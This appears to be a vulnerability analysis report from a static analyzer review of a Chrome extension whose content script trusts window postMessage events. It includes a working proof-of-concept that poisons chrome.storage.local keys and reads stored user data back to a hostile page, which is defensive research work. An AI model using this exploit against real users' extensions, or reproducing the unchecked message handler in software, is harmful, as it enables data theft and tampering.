# CoCo Analysis: paemmmaolgojladlndlbpgjpmflfcjoa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 9

---

## Sink 1-9: cs_window_eventListener_message → chrome_storage_local_set_sink / chrome_storage_local_remove_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/paemmmaolgojladlndlbpgjpmflfcjoa/opgen_generated_files/cs_0.js
Line 658: `window.addEventListener('message', function (ev) {`
Line 665: `if (ev.data == "") {`
Line 679: `saveChanges(ev.data.council + 'councilMCStatus', ev.data.councilMCStatus,true);`
Line 688: `removeStorage(ev.data.varname,true);`
Line 711: `saveChanges('unitMemberships', JSON.stringify(res),true);`
Line 727: `saveChanges('permissionDefaults', ev.data.permissionDefaults,true);`

**Code:**

```javascript
// Content script (cs_0.js)

// Entry point - Line 658
window.addEventListener('message', function (ev) {
    // ← attacker can postMessage from any webpage

    if (ev.data == "") {
        return;
    }

    // Handler for storing permissions - Line 725
    if (ev.data.text == 'setPerms') {
        saveChanges('permissionDefaults', ev.data.permissionDefaults, true);
        // ← attacker-controlled data written to storage
        return;
    }

    // Handler for getting vars - Line 668
    if (ev.data.text == 'getVars') {
        loadVarsMsg(false, ev.data.namevarlst, ev);
        // ← attacker can request stored data
        return;
    }

    // Multiple other storage write handlers (councilMCStatus, unitMemberships, mailGroups, dismissMsgName)
    // All write attacker-controlled data to chrome.storage.local
});

// Storage write function - Line 829
function saveChanges(varname, theValue, opt) {
    if (opt) {
        chrome.storage.local.set({[varname]: theValue});
        // ← Sink: attacker data stored
    }
}

// Storage read and exfiltration - Line 593
function loadVarsMsg(option, namevarLst, ev) {
    // ... loop through requested variables ...

    chrome.storage.local.get(namevar, function (items) {
        // Line 612 - Read from storage
        var namedata = items[namevar];

        // Line 636-638 - Send back to attacker
        var contentStr = vname + ' = ' + items[namevar] + ';\n'
        respObj = {text:'setvar', varname: vname, data: items[namevar]};
        ev.source.postMessage(JSON.parse(JSON.stringify(respObj)), ev.origin);
        // ← attacker receives poisoned data back
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From malicious webpage or attacker-controlled iframe:

// Step 1: Poison storage with malicious data
window.postMessage({
    text: 'setPerms',
    permissionDefaults: '{"malicious": "payload", "admin": true}'
}, '*');

// Or poison other storage keys
window.postMessage({
    text: 'councilMCStatus',
    council: 'evil',
    councilMCStatus: 'attacker_controlled_value'
}, '*');

// Step 2: Retrieve the poisoned data
window.postMessage({
    text: 'getVars',
    namevarlst: ['permissionDefaults', 'evilcouncilMCStatus', 'unitMemberships']
}, '*');

// Step 3: Listen for the response
window.addEventListener('message', function(e) {
    if (e.data.text === 'setvar') {
        console.log('Exfiltrated data:', e.data.varname, '=', e.data.data);
        // Attacker receives the stored data including any poisoned values
    }
});
```

**Impact:** Complete storage exploitation chain. Attacker can poison extension storage with arbitrary data via postMessage, then retrieve the poisoned data (and any other stored extension data) back via the same channel. This enables both data manipulation and information disclosure attacks against the extension's stored configuration and user data.
